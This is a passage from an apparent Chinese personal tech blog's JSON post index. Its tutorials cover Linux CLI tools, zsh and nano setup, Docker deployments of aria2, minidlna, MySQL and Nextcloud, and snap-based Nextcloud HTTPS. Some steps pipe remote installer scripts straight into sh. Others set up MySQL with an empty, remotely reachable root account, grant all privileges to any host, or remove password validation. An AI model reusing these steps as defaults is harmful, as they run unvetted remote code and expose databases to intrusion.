增加模糊搜索供能) 123git clone --depth 1 https://github.com/junegunn/fzf.git ~/.fzf~/.fzf/install# Ctrl + r 来使用 安装 vtop (用于替换 top 提高命令可读性) 123sudo apt install nodejs npm -y &amp;&amp; sudo npm i -g vtop# 创建别名echo 'alias top=\"vtop\"' &gt;&gt; $HOME/.zshrc 安装 fd (用于替换 find 用于更快速的文件搜索) 1wget https://github.com/sharkdp/fd/releases/download/v7.2.0/fd-musl_7.2.0_amd64.deb &amp;&amp; sudo dpkg -i fd-musl_7.2.0_amd64.deb &amp;&amp; rm fd-musl_7.2.0_amd64.deb 安装 tldr (用于替换 man 用于提高文档的可读性) 12sudo apt install nodejs npm -y &amp;&amp; sudo npm i -g tldrecho 'alias man=\"tldr\"' &gt;&gt; $HOME/.zshrc 安装 ack (用于替换 grep 提高速度与结果的可读性) 12sudo apt install silversearcher-ag -yecho 'alias grep=\"ag\"' &gt;&gt; $HOME/.zshrc 安装 atool (用于更舒适的解压和某些情况下 extract 插件无效的情况) 点击查看支持的类型 12345678sudo apt install atool -y# 用法atool -x xxx.tar.gz # 解压到当前文件夹atool -X /tmp xxx.tar.gz # 解压到tmp目录# 别名echo 'alias e=\"atool -x \"' &gt;&gt; $HOME/.zshrc# 用法e xxx.tar.gz # 解压到当前文件夹 很有用的工具(非必须) tree 用于显示目录结构，类似于 Windows 的命令 tree 1sudo apt install tree -y csvkit 用于处理 csv 文件相关的事情，非常实用强大 1sudo pip install csvkit entr 用于监控目录如发生制定情况则执行特定命令 ncdu 用于查看磁盘空间占用情况的工具，性能很高 1sudo apt install ncdu -y nnn 用于命令行管理文件的工具，性能很高，功能强大 1sudo apt install nnn -y pandoc 用于文档格式转换，例如 Markdown 转换为 docx 或 HTML 1sudo apt install pandoc pandoc-citeproc texlive -y zsh 配置 history 时间戳，记录每一条命令在什么时候执行的 12echo \"alias history='fc -il 1'\" &gt;&gt; $HOME/.zshrcecho 'HIST_STAMPS=\"yyyy-mm-dd\"' &gt;&gt; $HOME/.zshrc 替换主题为 af-magic 1sed -i 's/ZSH_THEME=\".*\"/ZSH_THEME=\"af-magic\"/g' $HOME/.zshrc ll 别名 1echo 'alias ll=\"ls -alhu --time-style=long-iso\"' &gt;&gt; $HOME/.zshrc 插件 插件的添加方法，如开启插件 zsh-autosuggestions 12# 编辑 ~/.zshrc 添加插件，逗号分隔plugins=(zsh-autosuggestions) zsh-syntax-highlighting 用于语法高亮，还能检测命令是否存在 12git clone https://github.com/zsh-users/zsh-syntax-highlighting.gitecho \"source $&#123;(q-)PWD&#125;/zsh-syntax-highlighting/zsh-syntax-highlighting.zsh\" &gt;&gt; $&#123;ZDOTDIR:-$HOME&#125;/.zshrc zsh-autosuggestions 用于命令提示，历史提示，非常有用 12345git clone https://github.com/zsh-users/zsh-autosuggestions ~/.oh-my-zsh/custom/plugins/zsh-autosuggestions# 自动激活 zsh-autosuggestionsecho \"$HOME/.oh-my-zsh/custom/plugins/zsh-autosuggestions/zsh-syntax-highlighting.zsh\" &gt;&gt; $HOME/.zshrc# 绑定快捷键 ` 为使用提示结果，否则默认为 →echo \"bindkey '\\`' autosuggest-accept\" &gt;&gt; $HOME/.zshrc sudo 当忘记打 sudo 时双击 esc 即可在命令最前端增加 sudo，再次双击 即可删除 extract 解压各类文件，直接 x filename.tar.gz 即可，省时省力 nano 配置nano 是 linux 中常见的，简单的文本编辑器，没有学习曲线，使用简单 1234# 查看是否安装which nano# 安装 nanosudo apt install nano nano 的配置文件默认保存在 /etc/nanorc 123456# 创建 配置存储目录mkdir -p ~/.config/nano# 复制默认配置到存储目录，这样即可开启 代码高亮cp /etc/nanorc ~/.config/nano/nanorc# 或者手动创建nano配置nano ~/.config/nano/nanorc 找到配置文件，去除 # 即可开启供能 开启鼠标 set mouse 开启行号 set linenumbers 开启自动缩进 set autoindent 隐藏快捷键提醒 set nohelp","categories":[{"name":"Linux","slug":"Linux","permalink":"https://blog.110.sh/categories/Linux/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://blog.110.sh/tags/Linux/"},{"name":"配置","slug":"配置","permalink":"https://blog.110.sh/tags/配置/"},{"name":"实用","slug":"实用","permalink":"https://blog.110.sh/tags/实用/"}]},{"title":"Linux 查看磁盘用量、UUID、设备名称、文件系统","slug":"linux-check-disk-usage-UUID-device-name-FS","date":"2018-08-22T01:27:39.000Z","updated":"2020-12-27T16:04:52.942Z","comments":true,"path":"2018/08/22/linux-check-disk-usage-UUID-device-name-FS/","link":"","permalink":"https://blog.110.sh/2018/08/22/linux-check-disk-usage-UUID-device-name-FS/","excerpt":"","text":"查看挂载的磁盘用量 1df -h 查看设备名称、UUID、文件系统 1blkid","categories":[{"name":"Linux","slug":"Linux","permalink":"https://blog.110.sh/categories/Linux/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://blog.110.sh/tags/Linux/"},{"name":"常用命令","slug":"常用命令","permalink":"https://blog.110.sh/tags/常用命令/"}]},{"title":"Linux 复制文件包含权限","slug":"linux-copy-with-permission","date":"2018-08-22T01:25:24.000Z","updated":"2020-12-27T16:04:52.942Z","comments":true,"path":"2018/08/22/linux-copy-with-permission/","link":"","permalink":"https://blog.110.sh/2018/08/22/linux-copy-with-permission/","excerpt":"","text":"复制、包含权限、递归复制、查看进度 1cp -vrp 来源 目的","categories":[{"name":"Linux","slug":"Linux","permalink":"https://blog.110.sh/categories/Linux/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://blog.110.sh/tags/Linux/"},{"name":"常用命令","slug":"常用命令","permalink":"https://blog.110.sh/tags/常用命令/"}]},{"title":"Docker 部署 Aria2 包含 WebUI","slug":"docker-deploy-aria2-with-webui","date":"2018-08-22T01:10:32.000Z","updated":"2020-12-27T16:04:52.942Z","comments":true,"path":"2018/08/22/docker-deploy-aria2-with-webui/","link":"","permalink":"https://blog.110.sh/2018/08/22/docker-deploy-aria2-with-webui/","excerpt":"Docker 部署 aria2 包含 WebUI","text":"Docker 部署 aria2 包含 WebUI Aria2 是一个下载工具 部署123456789sudo docker run -d \\ --restart=always \\ --name aria2-with-webui \\ -p 6800:6800 \\ -p 6880:80 \\ -v 本地保存下载内容的目录:/data \\ -e PGID=1000 \\ -e PUID=1000 \\ abcminiuser/docker-aria2-with-webui:latest-ng 部署完毕 控制重启 1sudo docker restart aria2-with-webui 停止 1sudo docker stop aria2-with-webui 开启 1sudo docker start aria2-with-webui 删除，要先停止，再删除 1sudo docker rm aria2-with-webui tracker 服务器BT 下载很多时候没有资源，或者下载很慢，添加 tracker 服务器能好一些 下面的 281 个服务器，更新于 2018/08/01 ，来源udp://public.popcorn-tracker.org:6969/announce,http://182.176.139.129:6969/announce,http://5.79.83.193:2710/announce,http://91.218.230.81:6969/announce,udp://tracker.ilibr.org:80/announce,http://atrack.pow7.com/announce,http://bt.henbt.com:2710/announce,http://mgtracker.org:2710/announce,http://mgtracker.org:6969/announce,http://open.touki.ru/announce.php,http://p4p.arenabg.ch:1337/announce,http://pow7.com:80/announce,http://retracker.krs-ix.ru:80/announce,http://secure.pow7.com/announce,http://t1.pow7.com/announce,http://t2.pow7.com/announce,http://thetracker.org:80/announce,http://torrentsmd.com:8080/announce,http://tracker.bittor.pw:1337/announce,http://tracker.dutchtracking.com:80/announce,http://tracker.dutchtracking.nl:80/announce,http://tracker.edoardocolombo.eu:6969/announce,http://tracker.ex.ua:80/announce,http://tracker.kicks-ass.net:80/announce,http://tracker1.wasabii.com.tw:6969/announce,http://tracker2.itzmx.com:6961/announce,http://www.wareztorrent.com:80/announce,udp://62.138.0.158:6969/announce,udp://eddie4.nl:6969/announce,udp://explodie.org:6969/announce,udp://shadowshq.eddie4.nl:6969/announce,udp://shadowshq.yi.org:6969/announce,udp://tracker.eddie4.nl:6969/announce,udp://tracker.mg64.net:2710/announce,udp://tracker.sktorrent.net:6969,udp://tracker2.indowebster.com:6969/announce,udp://tracker4.piratux.com:6969/announce,http://atrack.pow7.com/announce,http://bt.henbt.com:2710/announce,http://mgtracker.org:2710/announce,http://mgtracker.org:6969/announce,http://open.touki.ru/announce.php,http://p4p.arenabg.ch:1337/announce,http://pow7.com:80/announce,http://retracker.krs-ix.ru:80/announce,http://secure.pow7.com/announce,http://t1.pow7.com/announce,http://t2.pow7.com/announce,http://thetracker.org:80/announce,http://torrentsmd.com:8080/announce,http://tracker.bittor.pw:1337/announce,http://tracker.dutchtracking.com/announce,http://tracker.dutchtracking.com:80/announce,http://tracker.dutchtracking.nl:80/announce,http://tracker.edoardocolombo.eu:6969/announce,http://tracker.ex.ua:80/announce,http://tracker.kicks-ass.net:80/announce,http://tracker.mg64.net:6881/announce,http://tracker.tfile.me/announce,http://tracker1.wasabii.com.tw:6969/announce,http://tracker2.itzmx.com:6961/announce,http://tracker2.wasabii.com.tw:6969/announce,http://www.wareztorrent.com:80/announce,udp://bt.xxx-tracker.com:2710/announce,udp://eddie4.nl:6969/announce,udp://shadowshq.eddie4.nl:6969/announce,udp://shadowshq.yi.org:6969/announce,udp://tracker.eddie4.nl:6969/announce,udp://tracker.mg64.net:2710/announce,udp://tracker.mg64.net:6969/announce,udp://tracker.opentrackr.org:1337/announce,udp://tracker.sktorrent.net:6969,udp://tracker2.indowebster.com:6969/announce,udp://tracker4.piratux.com:6969/announce,udp://tracker.coppersurfer.tk:6969/announce,http://tracker.opentrackr.org:1337/announce,udp://zer0day.ch:1337/announce,udp://zer0day.to:1337/announce,http://explodie.org:6969/announce,udp://tracker.leechers-paradise.org:6969/announce,udp://9.rarbg.com:2710/announce,udp://9.rarbg.me:2780/announce,udp://9.rarbg.to:2730/announce,udp://p4p.arenabg.com:1337/announce,udp://tracker.sktorrent.net:6969/announce,http://p4p.arenabg.com:1337/announce,udp://tracker.aletorrenty.pl:2710/announce,http://tracker.aletorrenty.pl:2710/announce,http://tracker.bittorrent.am/announce,udp://tracker.kicks-ass.net:80/announce,http://tracker.kicks-ass.net/announce,http://tracker.baravik.org:6970/announce,udp://torrent.gresille.org:80/announce,http://torrent.gresille.org/announce,http://tracker.skyts.net:6969/announce,http://tracker.internetwarriors.net:1337/announce,udp://tracker.skyts.net:6969/announce,http://tracker.dutchtracking.nl/announce,udp://tracker.yoshi210.com:6969/announce,udp://tracker.tiny-vps.com:6969/announce,udp://tracker.internetwarriors.net:1337/announce,udp://mgtracker.org:2710/announce,http://tracker.yoshi210.com:6969/announce,http://tracker.tiny-vps.com:6969/announce,udp://tracker.filetracker.pl:8089/announce,udp://tracker.ex.ua:80/announce,udp://91.218.230.81:6969/announce,https://www.wareztorrent.com/announce,http://www.wareztorrent.com/announce,http://tracker.filetracker.pl:8089/announce,http://tracker.ex.ua/announce,http://tracker.calculate.ru:6969/announce,udp://tracker.grepler.com:6969/announce,udp://tracker.flashtorrents.org:6969/announce,udp://tracker.bittor.pw:1337/announce,http://tracker.tvunderground.org.ru:3218/announce,http://tracker.grepler.com:6969/announce,http://tracker.flashtorrents.org:6969/announce,http://retracker.gorcomnet.ru/announce,http://bt.pusacg.org:8080/announce,http://87.248.186.252:8080/announce,udp://tracker.kuroy.me:5944/announce,udp://182.176.139.129:6969/announce,http://tracker.kuroy.me:5944/announce,http://retracker.krs-ix.ru/announce,http://open.acgtracker.com:1096/announce,udp://open.stealth.si:80/announce,udp://208.67.16.113:8000/announce,http://tracker.dler.org:6969/announce,http://bt2.careland.com.cn:6969/announce,http://open.lolicon.eu:7777/announce,http://tracker.opentrackr.org:1337/announce,http://explodie.org:6969/announce,http://p4p.arenabg.com:1337/announce,http://tracker.aletorrenty.pl:2710/announce,http://tracker.bittorrent.am/announce,http://tracker.kicks-ass.net/announce,http://tracker.baravik.org:6970/announce,http://torrent.gresille.org/announce,http://tracker.skyts.net:6969/announce,http://tracker.internetwarriors.net:1337/announce,http://tracker.dutchtracking.nl/announce,http://tracker.yoshi210.com:6969/announce,http://tracker.tiny-vps.com:6969/announce,http://www.wareztorrent.com/announce,http://tracker.filetracker.pl:8089/announce,http://tracker.ex.ua/announce,http://tracker.calculate.ru:6969/announce,http://tracker.tvunderground.org.ru:3218/announce,http://tracker.grepler.com:6969/announce,http://tracker.flashtorrents.org:6969/announce,http://retracker.gorcomnet.ru/announce,http://bt.pusacg.org:8080/announce,http://87.248.186.252:8080/announce,http://tracker.kuroy.me:5944/announce,http://retracker.krs-ix.ru/announce,http://open.acgtracker.com:1096/announce,http://bt2.careland.com.cn:6969/announce,http://open.lolicon.eu:7777/announce,https://www.wareztorrent.com/announce,udp://213.163.67.56:1337/announce,http://213.163.67.56:1337/announce,udp://185.86.149.205:1337/announce,http://74.82.52.209:6969/announce,udp://94.23.183.33:6969/announce,udp://74.82.52.209:6969/announce,udp://151.80.120.114:2710/announce,udp://109.121.134.121:1337/announce,udp://168.235.67.63:6969/announce,http://109.121.134.121:1337/announce,udp://178.33.73.26:2710/announce,http://178.33.73.26:2710/announce,http://85.17.19.180/announce,udp://85.17.19.180:80/announce,http://210.244.71.25:6969/announce,http://85.17.19.180/announce,http://213.159.215.198:6970/announce,udp://191.101.229.236:1337/announce,http://178.175.143.27/announce,udp://89.234.156.205:80/announce,http://91.216.110.47/announce,http://114.55.113.60:6969/announce,http://195.123.209.37:1337/announce,udp://114.55.113.60:6969/announce,http://210.244.71.26:6969/announce,udp://107.150.14.110:6969/announce,udp://5.79.249.77:6969/announce,udp://195.123.209.37:1337/announce,udp://37.19.5.155:2710/announce,http://107.150.14.110:6969/announce,http://5.79.249.77:6969/announce,udp://185.5.97.139:8089/announce,udp://194.106.216.222:80/announce,udp://91.218.230.81:6969/announce,https://104.28.17.69/announce,http://104.28.16.69/announce,http://185.5.97.139:8089/announce,http://194.106.216.222/announce,http://80.246.243.18:6969/announce,http://37.19.5.139:6969/announce,udp://5.79.83.193:6969/announce,udp://46.4.109.148:6969/announce,udp://51.254.244.161:6969/announce,udp://188.165.253.109:1337/announce,http://91.217.91.21:3218/announce,http://37.19.5.155:6881/announce,http://46.4.109.148:6969/announce,http://51.254.244.161:6969/announce,http://104.28.1.30:8080/announce,http://81.200.2.231/announce,http://157.7.202.64:8080/announce,http://87.248.186.252:8080/announce,udp://128.199.70.66:5944/announce,udp://182.176.139.129:6969/announce,http://128.199.70.66:5944/announce,http://188.165.253.109:1337/announce,http://93.92.64.5/announce,http://173.254.204.71:1096/announce,udp://195.123.209.40:80/announce,udp://62.212.85.66:2710/announce,udp://208.67.16.113:8000/announce,http://125.227.35.196:6969/announce,http://59.36.96.77:6969/announce,http://87.253.152.137/announce,http://158.69.146.212:7777/announce,udp://tracker.coppersurfer.tk:6969/announce,udp://zer0day.ch:1337/announce,udp://tracker.leechers-paradise.org:6969/announce,udp://9.rarbg.com:2710/announce,udp://p4p.arenabg.com:1337/announce,udp://tracker.sktorrent.net:6969/announce,udp://tracker.aletorrenty.pl:2710/announce,udp://tracker.kicks-ass.net:80/announce,udp://torrent.gresille.org:80/announce,udp://tracker.skyts.net:6969/announce,udp://tracker.yoshi210.com:6969/announce,udp://tracker.tiny-vps.com:6969/announce,udp://tracker.internetwarriors.net:1337/announce,udp://mgtracker.org:2710/announce,udp://tracker.filetracker.pl:8089/announce,udp://tracker.ex.ua:80/announce,udp://91.218.230.81:6969/announce,udp://tracker.grepler.com:6969/announce,udp://tracker.flashtorrents.org:6969/announce,udp://tracker.bittor.pw:1337/announce,udp://tracker.kuroy.me:5944/announce,udp://182.176.139.129:6969/announce,udp://open.stealth.si:80/announce,udp://208.67.16.113:8000/announce,udp://tracker.coppersurfer.tk:6969/announce,http://tracker.opentrackr.org:1337/announce,udp://zer0day.ch:1337/announce,http://explodie.org:6969/announce,udp://tracker.leechers-paradise.org:6969/announce,udp://9.rarbg.com:2710/announce,udp://p4p.arenabg.com:1337/announce,udp://tracker.sktorrent.net:6969/announce,http://p4p.arenabg.com:1337/announce,udp://tracker.aletorrenty.pl:2710/announce,http://tracker.aletorrenty.pl:2710/announce,http://tracker.bittorrent.am/announce,udp://tracker.kicks-ass.net:80/announce,http://tracker.kicks-ass.net/announce,http://tracker.baravik.org:6970/announce,udp://tracker.piratepublic.com:1337/announce,udp://213.163.67.56:1337/announce,http://213.163.67.56:1337/announce,udp://185.86.149.205:1337/announce,http://74.82.52.209:6969/announce,udp://94.23.183.33:6969/announce,udp://74.82.52.209:6969/announce,udp://151.80.120.114:2710/announce,udp://109.121.134.121:1337/announce,udp://168.235.67.63:6969/announce,http://109.121.134.121:1337/announce,udp://178.33.73.26:2710/announce,http://178.33.73.26:2710/announce,http://85.17.19.180/announce,udp://85.17.19.180:80/announce,http://210.244.71.25:6969/announce,http://85.17.19.180/announce","categories":[{"name":"Docker","slug":"Docker","permalink":"https://blog.110.sh/categories/Docker/"}],"tags":[{"name":"Docker","slug":"Docker","permalink":"https://blog.110.sh/tags/Docker/"},{"name":"Aria2","slug":"Aria2","permalink":"https://blog.110.sh/tags/Aria2/"}]},{"title":"Docker 部署 minidlna 服务器","slug":"docker-deploy-minidlna-server","date":"2018-08-22T01:04:17.000Z","updated":"2020-12-27T16:04:52.942Z","comments":true,"path":"2018/08/22/docker-deploy-minidlna-server/","link":"","permalink":"https://blog.110.sh/2018/08/22/docker-deploy-minidlna-server/","excerpt":"Docker 部署 minidlna 服务器","text":"Docker 部署 minidlna 服务器 如果不喜欢 host 模式，可以映射 1900/udp 和 8200/tcp 端口，但是不知道为什么我这里使用端口映射会找不到 dlna 服务器 12345678910111213141516sudo docker run -d \\ --name=minidlna \\ --restart=always \\ --net=\"host\" \\ -v 本地视频目录:/media/videos \\ -v 本地音乐目录:/media/music \\ -v 本地图片目录:/media/pictures \\ -v 存储配置文件的目录:/config \\ -v /etc/localtime:/etc/localtime:ro \\ -e SCHEDULE_SCAN_DAYS=00 \\ -e SCHEDULE_SCAN_HOURS=12 \\ -e SCAN_ON_BOOT=yes \\ -e UMASK=000 \\ -e PUID=0 \\ -e PGID=0 \\ binhex/arch-minidlna 搭建完毕 控制服务重启 1sudo docker restart minidlna 停止 1sudo docker stop minidlna 开启 1sudo docker start minidlna 删除，要先停止，再删除 1sudo docker rm minidlna","categories":[{"name":"Docker","slug":"Docker","permalink":"https://blog.110.sh/categories/Docker/"}],"tags":[{"name":"Docker","slug":"Docker","permalink":"https://blog.110.sh/tags/Docker/"},{"name":"minidlna","slug":"minidlna","permalink":"https://blog.110.sh/tags/minidlna/"},{"name":"DLNA","slug":"DLNA","permalink":"https://blog.110.sh/tags/DLNA/"}]},{"title":"Nextcloud 重新扫描文件","slug":"nextcloud-rescan-file","date":"2018-08-22T00:07:06.000Z","updated":"2020-12-27T16:04:52.942Z","comments":true,"path":"2018/08/22/nextcloud-rescan-file/","link":"","permalink":"https://blog.110.sh/2018/08/22/nextcloud-rescan-file/","excerpt":"Nextcloud 重新扫描文件","text":"Nextcloud 重新扫描文件 webdav, smb 传输文件很慢，网页传输虽然还算可以但是传输目录结构复杂的很麻烦，用 sftp 要快得多 进入你的nextcloud容器，或者找到你的occ文件的目录 执行命令重新扫描 1occ files:scan --all 附加内容列出用户 1occ user:list 重新扫描指定用户zhangsan的文件 1occ files:scan zhangsan","categories":[{"name":"Docker","slug":"Docker","permalink":"https://blog.110.sh/categories/Docker/"}],"tags":[{"name":"Nextcloud","slug":"Nextcloud","permalink":"https://blog.110.sh/tags/Nextcloud/"}]},{"title":"Docker创建临时开发用MySQL服务器","slug":"docker-create-dev-mysql-server","date":"2018-08-15T02:31:31.000Z","updated":"2020-12-27T16:04:52.942Z","comments":true,"path":"2018/08/15/docker-create-dev-mysql-server/","link":"","permalink":"https://blog.110.sh/2018/08/15/docker-create-dev-mysql-server/","excerpt":"一句话创建 Docker MySQL 服务器，且允许远程登录","text":"一句话创建 Docker MySQL 服务器，且允许远程登录 1234567docker run -d -p 33306:3306 \\ -e MYSQL_ALLOW_EMPTY_PASSWORD=true \\ -e MYSQL_DATABASE=circle_test \\ -e MYSQL_HOST=0.0.0.0 \\ -e MYSQL_ROOT_HOST=% \\ -e MYSQL_USER=root \\ circleci/mysql:5.7.23 完事","categories":[{"name":"Docker","slug":"Docker","permalink":"https://blog.110.sh/categories/Docker/"}],"tags":[{"name":"MySQL","slug":"MySQL","permalink":"https://blog.110.sh/tags/MySQL/"},{"name":"Docker","slug":"Docker","permalink":"https://blog.110.sh/tags/Docker/"}]},{"title":"MySQL允许用户远程登录","slug":"mysql-allow-user-login-from-remote","date":"2018-08-15T02:15:19.000Z","updated":"2020-12-27T16:04:52.942Z","comments":true,"path":"2018/08/15/mysql-allow-user-login-from-remote/","link":"","permalink":"https://blog.110.sh/2018/08/15/mysql-allow-user-login-from-remote/","excerpt":"MySQL允许用户远程登录","text":"MySQL允许用户远程登录 执行这段 12GRANT ALL PRIVILEGES on *.* to 用户名@'%' IDENTIFIED by \"password\";FLUSH PRIVILEGES; 如果提示这个，可以卸载掉密码验证插件 (1819, ‘Your password does not satisfy the current policy requirements’) 1uninstall plugin validate_password;","categories":[{"name":"MySQL","slug":"MySQL","permalink":"https://blog.110.sh/categories/MySQL/"}],"tags":[{"name":"MySQL","slug":"MySQL","permalink":"https://blog.110.sh/tags/MySQL/"}]},{"title":"推荐MySQL客户端","slug":"mysql-client-recommendation","date":"2018-08-15T01:24:18.000Z","updated":"2020-12-27T16:04:52.942Z","comments":true,"path":"2018/08/15/mysql-client-recommendation/","link":"","permalink":"https://blog.110.sh/2018/08/15/mysql-client-recommendation/","excerpt":"推荐一个好用的MySQL客户端，mycli","text":"推荐一个好用的MySQL客户端，mycli 安装使用这个命令行下的客户端带有代码高亮、自动补全、危险操作确认、数据屏幕滚动等的功能 安装1sudo apt install mycli 使用12# 默认有 -p 参数mycli -u root 坑当查询结果某一列为纯数字时，他会尝试仅保留3位小数，这个很坑，要注意 当然如果你的数据不要求高精度那就是最理想的了","categories":[{"name":"MySQL","slug":"MySQL","permalink":"https://blog.110.sh/categories/MySQL/"}],"tags":[{"name":"MySQL","slug":"MySQL","permalink":"https://blog.110.sh/tags/MySQL/"}]},{"title":"基于Docker安装Nextcloud且配置HTTPS","slug":"setup-nextcloud-docker-and-https","date":"2018-08-13T08:42:46.000Z","updated":"2020-12-27T16:04:52.946Z","comments":true,"path":"2018/08/13/setup-nextcloud-docker-and-https/","link":"","permalink":"https://blog.110.sh/2018/08/13/setup-nextcloud-docker-and-https/","excerpt":"本次在Ubuntu18.04上使用Docker安装Nextcloud并配置HTTPS","text":"本次在Ubuntu18.04上使用Docker安装Nextcloud并配置HTTPS 配置 这东西让我从半夜两点折腾到早上6点半！ 遇到问题一定要看容器日志 通篇都不要忘记修改cloud.example.com为自己的域名 安装Docker1curl -sSL https://get.daocloud.io/docker | sh 安装 docker-compose1sudo apt install docker-compose 配置Docker Hub镜像[可选步骤]去这里来 https://www.daocloud.io/mirror 搞一个账号权限回来，然后复制Linux的命令 1curl -sSL https://get.daocloud.io/daotools/set_mirror.sh | sh -s http://xxxxx.m.daocloud.io 执行后重启Docker服务 1sudo systemctl restart docker.service Docker 常用命令[可选看]123456# 查看运行中的容器docker ps# 查看本地镜像docker images# 打开容器的shellsudo docker exec -i -t 容器名称 shell名称[sh/bash] 创建必要的目录1mkdir -p nextcloud/data nextcloud/config nextcloud/apps nextcloud/themes nextcloud/redis nextcloud/docker/nginx/conf.d 编写 docker-compose.yml1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162version: '2'networks: default: driver: bridgeservices: C-nginx: image: nginx container_name: C-nginx expose: - \"443\" #暴露nextcloud的443端口，以用作映射 - \"80\" #暴露nginx的80端口，以用作映射 ports: - \"80:80\" #映射80端口到本机80端口 - \"443:443\" #映射443端口到本机443端口 depends_on: - C-nextcloud volumes: - 刚才创建的目录的路径/nextcloud/docker/nginx/conf.d:/etc/nginx/conf.d # Place your vhost here - 本地证书目录:/etc/nginx/crt # SSL restart: always C-nextcloud: image: wonderfall/nextcloud container_name: C-nextcloud expose: - \"8888\" depends_on: - C-redis # If using Redis environment: - UID=1000 - GID=1000 - UPLOAD_MAX_SIZE=10G - MEMORY_LIMIT=1024M - APC_SHM_SIZE=256M - OPCACHE_MEM_SIZE=256 - CRON_PERIOD=10m - TZ=Asia/Shanghai - ADMIN_USER=adminuser # Don't set to configure through browser - ADMIN_PASSWORD=adminpassword # Don't set to configure through browser - DOMAIN=cloud.example.com - DB_TYPE=mysql # Or sqlite3 - DB_NAME=nextcloud - DB_USER=user - DB_PASSWORD=password - DB_HOST=172.10.0.1 # 你的Mysql的服务器的IP，或者宿主机的IP volumes: - 刚才创建的目录的路径/nextcloud/data:/data - 刚才创建的目录的路径/nextcloud/config:/config - 刚才创建的目录的路径/nextcloud/apps:/apps2 - 刚才创建的目录的路径/nextcloud/themes:/nextcloud/themes restart: always # If using Redis C-redis: image: redis:alpine container_name: C-redis volumes: - 刚才创建的目录的路径/redis:/data restart: always expose: - \"6379\" 创建 nextcloud.conf记得修改域名、证书 文件保存在 刚才创建的目录的路径/nextcloud/docker/nginx/conf.d 123456789101112131415161718192021222324252627282930313233server &#123; listen 80 http2; server_name cloud.example.com; return 301 https://$host$request_uri;&#125;server &#123; listen 443 ssl http2; server_name cloud.example.com; ssl_certificate /etc/nginx/crt/example.com.cert.pem; ssl_certificate_key /etc/nginx/crt/example.com.key.pem; error_page 497 https://$host:443$request_uri; client_max_body_size 10G; location / &#123; proxy_redirect off; proxy_pass http://C-nextcloud:8888; proxy_buffering off; proxy_set_header Host $http_host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_set_header Upgrade $http_upgrade; proxy_set_header Connection &quot;Upgrade&quot;; proxy_set_header X-Forwarded-Proto https; proxy_read_timeout 300s; &#125; location = /.htaccess &#123; return 404; &#125;&#125; 开始部署12cd 刚才创建的目录的路径/nextcloud/dockersudo docker-compose up -d 部署完毕后他会自动启动，并且开机启动，自动重启 在Config.php中配置Redis123456789101112# Redis'memcache.distributed' =&gt; '\\\\OC\\\\Memcache\\\\Redis','memcache.locking' =&gt; '\\\\OC\\\\Memcache\\\\Redis','redis' =&gt; array ( 'host' =&gt; 'C-redis', 'port' =&gt; 6379, 'openssl' =&gt; array ( 'config' =&gt; '/absolute/location/of/openssl.cnf', ),), 在Config.php中配置数据库12345678'dbtype' =&gt; 'mysql','dbname' =&gt; 'nextcloud','dbhost' =&gt; '数据库主机:端口','dbport' =&gt; '数据库主机的端口','dbtableprefix' =&gt; 'oc_', # 数据库表前缀'mysql.utf8mb4' =&gt; true,'dbuser' =&gt; 'oc_baixl', # 自动生成'dbpassword' =&gt; '5/YmXC7/OP15T9Ge73D7Y9R2tzODDK', #自动生成 在Config.php配置重定向地址12'overwritehost' =&gt; 'cloud.example.com','overwriteprotocol' =&gt; 'https', 在Config.php中配置允许的域名1234'trusted_domains' =&gt; array( 0 =&gt; 'cloud.example.com', 1 =&gt; '域名'), 排查错误刚才创建的3个容器的名字分别是C-nginx、C-redis、C-nextcloud 想要查看某个容器的日志就直接使用下面的命令 1sudo docker logs -f -t --tail 10 容器名称 停止、删除容器当你不想玩了，就先停止然后再删除容器 1234# 停止容器sudo docker stop C-nginx C-nextcloud C-redis# 删除容器sudo docker rm C-nginx C-nextcloud C-redis 删除Docker清理Docker 1sudo docker system prune 删除刚才安装的一切东西 1sudo apt remove docker docker-engine docker.io docker-compose &amp;&amp; sudo apt purge docker-ce &amp;&amp; sudo apt autoremove -y","categories":[{"name":"Linux","slug":"Linux","permalink":"https://blog.110.sh/categories/Linux/"}],"tags":[{"name":"Ubuntu","slug":"Ubuntu","permalink":"https://blog.110.sh/tags/Ubuntu/"},{"name":"Linux","slug":"Linux","permalink":"https://blog.110.sh/tags/Linux/"},{"name":"Docker","slug":"Docker","permalink":"https://blog.110.sh/tags/Docker/"},{"name":"Nextcloud","slug":"Nextcloud","permalink":"https://blog.110.sh/tags/Nextcloud/"}]},{"title":"使用Snap安装nextcloud网盘并配置HTTPS","slug":"install-nextcloud-by-snap-and-setup-https","date":"2018-08-13T08:08:04.000Z","updated":"2020-12-27T16:04:52.942Z","comments":true,"path":"2018/08/13/install-nextcloud-by-snap-and-setup-https/","link":"","permalink":"https://blog.110.sh/2018/08/13/install-nextcloud-by-snap-and-setup-https/","excerpt":"在Ubuntu 18.04中使用snap来安装Nextcloud网盘，并使用自定义证书配置HTTPS","text":"在Ubuntu 18.04中使用snap来安装Nextcloud网盘，并使用自定义证书配置HTTPS 配置安装nextcloud1sudo snap install nextcloud 使用自定义证书启用HTTPS这一步我卡了很久，最终找到了解决办法 首先证书文件名是固定的 分别为 cert.pem、privkey.pem、chain.pem 需要把证书文件复制到 /var/snap/nextcloud/current/certs/custom/ 下，并保持和上面的文件名一致 或者使用硬链接连接证书到这个目录下，并保持和上面的文件名一致 然后开启HTTPS和HSTS 1sudo nextcloud.enable-https custom -s cert.pem privkey.pem chain.pem 添加信任域名这里想添加多少就添加多少，随意的 12sudo nextcloud.occ config:system:set trusted_domains 1 --value=域名或者IP地址1sudo nextcloud.occ config:system:set trusted_domains 2 --value=域名或者IP地址2 设置主要的重定向域名通过这个设置，会使用户在访问不论哪个地址都跳转到设置的域名上 1sudo snap set nextcloud overwrite.cli.url=主域名，最好是HTTPS的域名 建议 